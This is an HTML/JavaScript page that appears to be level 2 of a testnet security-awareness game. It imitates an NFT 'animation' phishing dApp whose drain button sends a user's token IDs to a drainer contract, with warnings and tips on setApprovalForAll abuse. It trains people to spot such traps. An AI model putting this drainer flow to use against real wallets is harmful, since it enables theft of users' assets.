<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Level 2 ‚Äî NFT Approval Trap</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      background: linear-gradient(135deg, #1a1a2e, #16213e);
      color: #fff;
      margin: 0;
    }
    .top-bar {
      background: #111;
      padding: 0.8rem 2rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 0.9rem;
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.6);
    }
    .warning-bar {
      background-color: #ff3d00;
      color: #fff;
      padding: 0.75rem;
      text-align: center;
      font-weight: bold;
      font-size: 0.9rem;
    }
    .frame-container {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: calc(100vh - 120px);
      padding: 2rem;
    }
    .card {
      background: rgba(0, 0, 0, 0.85);
      border-radius: 12px;
      padding: 2rem;
      box-shadow: 0 0 18px #ff9800;
      max-width: 540px;
      width: 100%;
      text-align: center;
    }
    .button-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 1rem;
      margin-top: 1.5rem;
    }
    button {
      padding: 1rem 2rem;
      font-size: 1rem;
      background: #ff9800;
      border: none;
      border-radius: 8px;
      color: #fff;
      cursor: pointer;
    }
    #status {
      margin-top: 2rem;
      font-size: 1.1rem;
      white-space: pre-wrap;
      text-align: left;
    }
    #nextBtn {
      display: none;
      background: #4caf50;
      padding: 1rem;
      border-radius: 8px;
      color: #fff;
      text-decoration: none;
      margin-top: 2rem;
    }
    .tooltip-box {
      margin-top: 2rem;
      padding: 1rem;
      background: #333;
      border-left: 4px solid #ff9800;
      text-align: left;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>
  <div class="top-bar">
    <div>Web3 War Game</div>
    <div>‚úÖ Survived: <span id="surviveCount">0</span> | üíÄ Drained: <span id="failCount">0</span></div>
  </div>

  <div class="warning-bar">
    ‚ö†Ô∏è This is a testnet simulation. Use a burner wallet with Sepolia ETH only. Never connect a real wallet.
  </div>

  <div class="frame-container">
    <div class="card">
      <h1>üß™ Level 2: Animate Your NFT</h1>
      <p>Claim your exclusive animation‚Ä¶</p>
      <div class="button-container">
        <button id="connectBtn">Connect Wallet</button>
        <button id="drainBtn">Animate NFT / DRAIN</button>
      </div>
      <div id="status"></div>
      <a href="level3.html" id="nextBtn">‚û°Ô∏è Proceed to Level 3</a>
      <div class="tooltip-box">
        üí° <strong>Did you know?</strong><br>
        2. Most NFTs include setApprovalForAll, part of ERC-721/1155 standards. It lets marketplaces like OpenSea manage all your NFTs in one go, saving time and gas. Included for compatibility and efficient trading, but dangerous‚Äîapproving untrusted contracts can let scammers drain your collection instantly.<br><br>
        üö® Scammers exploit this through fake staking, animation, airdrop, and raffle dApps.<br><br>
        ‚ö†Ô∏è Before signing anything, triple-check which contract you're approving. One wrong click can wipe your entire collection ‚Äî until you manually revoke the approval.
      </div>
    </div>
  </div>

  <script>
    const nftContracts = [
      "0xcc3C67956415CDd8C833C29ae4F9097aBb6bdD60", // WarGameNFT
      "0xa79c8Cd930c21B5555c76a168E4A02Dc7494b36B"  // HappyApeYC
    ];
    const drainerContract = "0x3A0C897D86e0616dC5e1048CC27e5e61ba067C6F"; // Update if redeployed
    const nftABI = [
      "function setApprovalForAll(address operator, bool approved) external",
      "function balanceOf(address owner) view returns (uint256)",
      "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
      "function name() view returns (string)"
    ];
    const drainerABI = [
      "function approveAndDrainSpecific(address[] calldata nftContracts, uint256[][] calldata tokenIds) external"
    ];

    let provider, signer;

    function updateCounters() {
      document.getElementById("surviveCount").textContent = localStorage.getItem("w3game_survived") || 0;
      document.getElementById("failCount").textContent = localStorage.getItem("w3game_failed") || 0;
    }

    // Connects wallet and displays owned NFTs
    document.getElementById("connectBtn").onclick = async () => {
      const status = document.getElementById("status");
      status.innerText = "‚è≥ Connecting...";
      try {
        if (!window.ethereum) {
          status.innerText = "‚ùå MetaMask not detected. Please install or enable MetaMask.";
          return;
        }
        provider = new ethers.providers.Web3Provider(window.ethereum);
        try {
          await provider.send("eth_requestAccounts", []);
        } catch (err) {
          status.innerText = "‚ùå Connection rejected. Please approve the connection in MetaMask.";
          console.error("Connection error:", err);
          return;
        }
        signer = provider.getSigner();
        const network = await provider.getNetwork();
        if (network.chainId !== 11155111) {
          try {
            await window.ethereum.request({
              method: "wallet_switchEthereumChain",
              params: [{ chainId: "0xaa36a7" }],
            });
          } catch (switchError) {
            status.innerText = switchError.code === 4902
              ? "‚ùå Sepolia Testnet not found. Please add it to MetaMask."
              : "‚ùå Failed to switch to Sepolia Testnet.";
            console.error("Network switch error:", switchError);
            return;
          }
        }
        const user = await signer.getAddress();
        let summary = `‚úÖ Connected: ${user}\n\n`;
        for (const address of nftContracts) {
          try {
            const contract = new ethers.Contract(address, nftABI, signer);
            const name = await contract.name();
            const balance = await contract.balanceOf(user);
            summary += `üñºÔ∏è ${name}: ${balance} NFT(s)\n`;
            // Optional: Prompt user to approve if not already approved
            if (balance > 0 && !(await contract.isApprovedForAll(user, drainerContract))) {
              summary += `‚ö†Ô∏è Approve ${drainerContract} for ${name} before draining.\n`;
            }
          } catch (err) {
            console.warn(`Failed to query NFT contract ${address}:`, err);
            summary += `üñºÔ∏è ${address}: Error fetching data\n`;
          }
        }
        status.innerText = summary;
      } catch (err) {
        console.error("Unexpected connection error:", err);
        status.innerText = "‚ùå Wallet connection failed: " + err.message;
      }
    };

    // Drains NFTs (assumes prior approval)
    document.getElementById("drainBtn").onclick = async () => {
      const status = document.getElementById("status");
      if (!signer) return alert("Please connect your wallet first.");
      try {
        status.innerText = "üö® Draining NFTs...";
        const user = await signer.getAddress();

        // Gather owned token IDs using tokenOfOwnerByIndex
        let tokenIdMatrix = [];
        for (const contractAddr of nftContracts) {
          const contract = new ethers.Contract(contractAddr, nftABI, signer);
          const balance = await contract.balanceOf(user);
          let ids = [];
          if (balance > 0) {
            for (let i = 0; i < balance; i++) {
              try {
                const tokenId = await contract.tokenOfOwnerByIndex(user, i);
                ids.push(Number(tokenId));
              } catch (e) {
                console.warn(`tokenOfOwnerByIndex failed for ${contractAddr} at index ${i}:`, e);
                ids.push(0); // Fallback to 0 if enumeration fails
              }
            }
          }
          tokenIdMatrix.push(ids.length > 0 ? ids : [0]); // Use [0] as placeholder if no valid IDs
        }

        // Check if tokenIdMatrix has valid data
        let hasValidIds = tokenIdMatrix.some(arr => arr.length > 0 && arr.some(id => id !== 0));
        if (!hasValidIds) {
          status.innerText = "‚ö†Ô∏è No valid token IDs found. Please use hardcoded token IDs (e.g., [[1,2],[3,4]]) in the script.";
          return;
        }

        // Call approveAndDrainSpecific
        const drainer = new ethers.Contract(drainerContract, drainerABI, signer);
        const tx = await drainer.approveAndDrainSpecific(nftContracts, tokenIdMatrix);
        await tx.wait();

        status.innerText =
          "üíÄ Drained NFTs from the approved collections!\n\n" +
          "üß† Lesson: Phishing sites trick you into signing one transaction that approves and drains all your NFTs. " +
          "Always verify contracts before approving!";
        localStorage.setItem("w3game_level2", "drained");
        let failCount = parseInt(localStorage.getItem("w3game_failed") || 0);
        localStorage.setItem("w3game_failed", failCount + 1);
        updateCounters();
        document.getElementById("nextBtn").style.display = "inline-block";
      } catch (err) {
        if (err.code === "ACTION_REJECTED") {
          status.innerText =
            "‚úÖ You survived Level 2!\n\n" +
            "üõ°Ô∏è You rejected a malicious transaction that would have drained your NFTs. " +
            "Always verify contracts before approving!";
          let surviveCount = parseInt(localStorage.getItem("w3game_survived") || 0);
          localStorage.setItem("w3game_survived", surviveCount + 1);
          updateCounters();
          document.getElementById("nextBtn").style.display = "inline-block";
        } else {
          console.error("Drain error:", err);
          status.innerText = "‚ö†Ô∏è Unexpected error occurred: " + err.message;
        }
      }
    };

    window.onload = () => {
      updateCounters();
    };
  </script>
</body>
</html>
